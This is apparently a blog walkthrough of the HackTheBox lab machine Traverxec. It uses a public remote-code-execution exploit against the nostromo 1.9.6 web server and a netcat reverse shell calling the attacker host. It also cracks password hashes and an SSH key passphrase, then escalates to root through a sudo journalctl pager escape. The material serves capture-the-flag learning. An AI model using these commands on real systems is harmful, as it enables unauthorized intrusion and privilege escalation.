---
layout: post
cover: True
cover: 'https://github.com/yaserfaraj/yaserfaraj.github.io/blob/master/assets/images/travexec-dash.png'
title: "[HackTheBox] - Traverxec - Walkthrough"
date:   2020-04-11 07:18:00
tags: CTF hackthebox Hacking ITsecurity
categories: 'HackTheBox'
navigation: True
---
In this post, I will walk you through my steps to exploit and getting user and root access to the HacktheBox machine `traverxec`. This machine is rates as easy and it required some of research skills and Linux OS skill in order to be able to complete it. 

<p align="center">
  <img src="/assets/images/travexec-dash.png" />
</p>

### Ports using `masscan`
```sh
yas3r@Kal1:~/hackthebox/traverxec$ sudo masscan -e tun0 --rate=1000 -p1-65535 -n 10.10.10.165
[sudo] password for yas3r: 

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-04-10 23:58:28 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
Discovered open port 22/tcp on 10.10.10.165                                    
Discovered open port 80/tcp on 10.10.10.165                                    
yas3r@Kal1:~/hackthebox/traverxec$ 
```

### NMAP
```bash
yas3r@Kal1:~/hackthebox/traverxec$ sudo nmap -sV -sT -vv -T4 -n -Pn -p80,22 -sC -A 10.10.10.165
*** DELETED ***
Scanning 10.10.10.165 [2 ports]
Discovered open port 80/tcp on 10.10.10.165
Discovered open port 22/tcp on 10.10.10.165
Completed Connect Scan at 20:01, 0.07s elapsed (2 total ports)
Initiating Service scan at 20:01
Scanning 2 services on 10.10.10.165
Completed Service scan at 20:01, 6.15s elapsed (2 services on 1 host)
*** DELETED ***

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDVWo6eEhBKO19Owd6sVIAFVCJjQqSL4g16oI/DoFwUo+ubJyyIeTRagQNE91YdCrENXF2qBs2yFj2fqfRZy9iqGB09VOZt6i8oalpbmFwkBDtCdHoIAZbaZFKAl+m1UBell2v0xUhAy37Wl9BjoUU3EQBVF5QJNQqvb/mSqHsi5TAJcMtCpWKA4So3pwZcTatSu5x/RYdKzzo9fWSS6hjO4/hdJ4BM6eyKQxa29vl/ea1PvcHPY5EDTRX5RtraV9HAT7w2zIZH5W6i3BQvMGEckrrvVTZ6Ge3Gjx00ORLBdoVyqQeXQzIJ/vuDuJOH2G6E/AHDsw3n5yFNMKeCvNNL
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLpsS/IDFr0gxOgk9GkAT0G4vhnRdtvoL8iem2q8yoRCatUIib1nkp5ViHvLEgL6e3AnzUJGFLI3TFz+CInilq4=
|   256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGJ16OMR0bxc/4SAEl1yiyEUxC3i/dFH7ftnCU7+P+3s
80/tcp open  http    syn-ack nostromo 1.9.6
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
*** DELETED ***

TRACEROUTE (using proto 1/icmp)
HOP RTT      ADDRESS
1   71.20 ms 10.10.14.1
2   71.45 ms 10.10.10.165
*** DELETED ***

```

### NOSTROMO v1.9.6
immediately, we can see that the type and version of the web server which is `nostromo 1.9.6`. Let search for any well-known vulnerabilities:

```sh
yas3r@Kal1:~/hackthebox/traverxec$ searchsploit nostromo 1.9.6
----------------------------------------------------------------- 
 Exploit Title                                                   |  Path
                                                                 | (/usr/share/exploitdb/)
----------------------------------------------------------------- 
nostromo 1.9.6 - Remote Code Execution                           | exploits/multiple/remote/47837.py
----------------------------------------------------------------- 
Shellcodes: No Result
yas3r@Kal1:~/hackthebox/traverxec$
```

Nice we have the same exact version. Lets use it.

```bash
yas3r@Kal1:~/hackthebox/traverxec$ python 47837.py 10.10.10.165 80 "id"


                                        _____-2019-16278
        _____  _______    ______   _____\    \   
   _____\    \_\      |  |      | /    / |    |  
  /     /|     ||     /  /     /|/    /  /___/|  
 /     / /____/||\    \  \    |/|    |__ |___|/  
|     | |____|/ \ \    \ |    | |       \        
|     |  _____   \|     \|    | |     __/ __     
|\     \|\    \   |\         /| |\    \  /  \    
| \_____\|    |   | \_______/ | | \____\/    |   
| |     /____/|    \ |     | /  | |    |____/|   
 \|_____|    ||     \|_____|/    \|____|   | |   
        |____|/                        |___|/    




HTTP/1.1 200 OK
Date: Sat, 11 Apr 2020 00:08:19 GMT
Server: nostromo 1.9.6
Connection: close


uid=33(www-data) gid=33(www-data) groups=33(www-data)

yas3r@Kal1:~/hackthebox/traverxec$
``` 

It works. Let get reverse shell and listen on port 1337 on the other terminal.
```
yas3r@Kal1:~/hackthebox/traverxec$ python 47837.py 10.10.10.165 80 "nc 10.10.14.2 1337 -e /bin/bash"

```

```
yas3r@Kal1:~$ nc -lvp 1337
listening on [any] 1337 ...
connect to [10.10.14.2] from traverxec.htb [10.10.10.165] 46810
python -c "import pty;pty.spawn('/bin/bash')"
www-data@traverxec:/usr/bin$ export TERM=linux
export TERM=linux
www-data@traverxec:/usr/bin$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


### PrivEsc to `david`
we found `david` user in the system but we don't have permission to list his files but interestingly we can read files!!
```
www-data@traverxec:/var/nostromo$ cd /home
cd /home
www-data@traverxec:/home$ ls -la
ls -la
total 12
drwxr-xr-x  3 root  root  4096 Oct 25 14:32 .
drwxr-xr-x 18 root  root  4096 Oct 25 14:17 ..
drwx--x--x  6 david david 4096 Apr 10 19:18 david
www-data@traverxec:/home$ source david/.bashrc
source david/.bashrc
```

I also run `linpeas.sh` but I couldn't get good finds. Instead lets check the web-server files.
```
www-data@traverxec:/home$ cd /var/no*
cd /var/no*
www-data@traverxec:/var/nostromo$ ls -l
ls -l
total 16
drwxr-xr-x 2 root     daemon 4096 Oct 27 16:12 conf
drwxr-xr-x 6 root     daemon 4096 Oct 25 17:11 htdocs
drwxr-xr-x 2 root     daemon 4096 Oct 25 14:43 icons
drwxr-xr-x 2 www-data daemon 4096 Apr 10 14:50 logs
www-data@traverxec:/var/nostromo$ 
```
I also find `.htpasswd` file that has encrypted password. lets crack it with `hashcat`
```
www-data@traverxec:/var/nostromo$ cat conf/.htpasswd
cat conf/.htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
www-data@traverxec:/var/nostromo$ 
```

On my host machine
```
yas3r@linux[~/Desktop/hashcat-5.1.0]$ ./hashcat64.bin -m 500 /tmp/daivd.hash /usr/share/wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt -O
hashcat (v5.1.0) starting...

*** DELETED ***
Dictionary cache hit:
* Filename..: /usr/share/wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/:Nowonly4me    
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)
Hash.Target......: $1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
Time.Started.....: Fri Apr 10 03:58:31 2020 (1 sec)
Time.Estimated...: Fri Apr 10 03:58:32 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 10518.0 kH/s (12.48ms) @ Accel:512 Loops:250 Thr:32 Vec:1
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 11350007/14344384 (79.13%)
Rejected.........: 208887/11350007 (1.84%)
Restore.Point....: 10213991/14344384 (71.21%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:750-1000
Candidates.#1....: alliee24 -> Brandydd7
Hardware.Mon.#1..: Temp: 46c Fan: 25% Util: 39% Core:1830MHz Mem:6800MHz Bus:16

Started: Fri Apr 10 03:58:28 2020
Stopped: Fri Apr 10 03:58:34 2020
yas3r@linux[~/Desktop/hashcat-5.1.0]$
```

Nice, now we have a credential for user `david` but it didn't work for sshing to the server or using `sudo`
```
david: Nowonly4me
```

Lets read the configuration file of the web-server:

```
www-data@traverxec:/var/nostromo$ cd conf
cd conf
www-data@traverxec:/var/nostromo/conf$ ls -l
ls -l
total 8
-rw-r--r-- 1 root bin 2928 Oct 25 14:26 mimes
-rw-r--r-- 1 root bin  498 Oct 25 15:20 nhttpd.conf
www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf
cat nhttpd.conf
# MAIN [MANDATORY]

*** DELETED ***

homedirs		/home
homedirs_public		public_www
www-data@traverxec:/var/nostromo/conf$
```

from these information, we can guess the URL or `david` home file look like.

```
www-data@traverxec:/var/nostromo/conf$ ls -l /home/david/public_www
ls -l /home/david/public_www
total 8
-rw-r--r-- 1 david david  402 Oct 25 15:45 index.html
drwxr-xr-x 2 david david 4096 Oct 25 17:02 protected-file-area
www-data@traverxec:/var/nostromo/conf$
```

OR by visiting the URL: `http://10.10.10.165/~david/`

As we can see, there is a `protected-file-area` which contains the 
```
www-data@traverxec:/var/nostromo/conf$ ls -l /home/david/public_www/protected-file-area
le-areahome/david/public_www/protected-fil
total 4
-rw-r--r-- 1 david david 1915 Oct 25 17:02 backup-ssh-identity-files.tgz
www-data@traverxec:/var/nostromo/conf$
```
After downloading the `tgz` file, and trying to ssh to the server, it seems that we need to crack the `passphrase` for the key. Thus, using `ssh2john.py` convert it to a format that the `john` can deal with and finally crack it.

```
yas3r@Kal1:~/hackthebox/traverxec/home/david/.ssh$ cat david-passphase.txt 
sudo] password for yas3r: 
*** DELETED ***
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
hunter           (id_rsa)
```
Nice, we found it,`hunter`, now lets ssh to the server using `david` private key.


```bash
yas3r@Kal1:~/hackthebox/traverxec/home/david/.ssh$ ssh david@10.10.10.165 -i id_rsa
Enter passphrase for key 'id_rsa': 
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
Last login: Fri Apr 10 19:17:04 2020 from 10.10.14.2
david@traverxec:~$
```
and here is the flag
```sh
david@traverxec:~$ wc -c user.txt 
33 user.txt
```

### PrivEsc to `root`
After looking around, I found interesting file that relieves something important.
```
david@traverxec:~$ cat bin/server-stats.sh 
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
david@traverxec:~$ 
```

We can see that `david` has `sudo` permission without password to execute `journalctl`. We found something useful on [GTFOBins](https://gtfobins.github.io/gtfobins/journalctl/). so lets use it. However, it is a bit tricky.
first we execute `sudo journalctl -n5 -unostromo.service` and minimize the terminal till you notice it looks like `vim`. Then type `!/bin/bash`

```bash
Apr 10 18:29:03 traverxec cron[9204]: (CRON) DEATH (can't open or create 
Apr 10 18:29:13 traverxec cron[9205]: (CRON) DEATH (can't open or create 
~
~
!/bin/bash
root@traverxec:/home/david# 
```
And here is the flag
```
root@traverxec:/home/david# cd
root@traverxec:~# wc -c root.txt 
33 root.txt
root@traverxec:~#
```

Hope you like it.

Yas3r

<p align="center">
  <img src="/assets/images/travexec.png" />
</p>

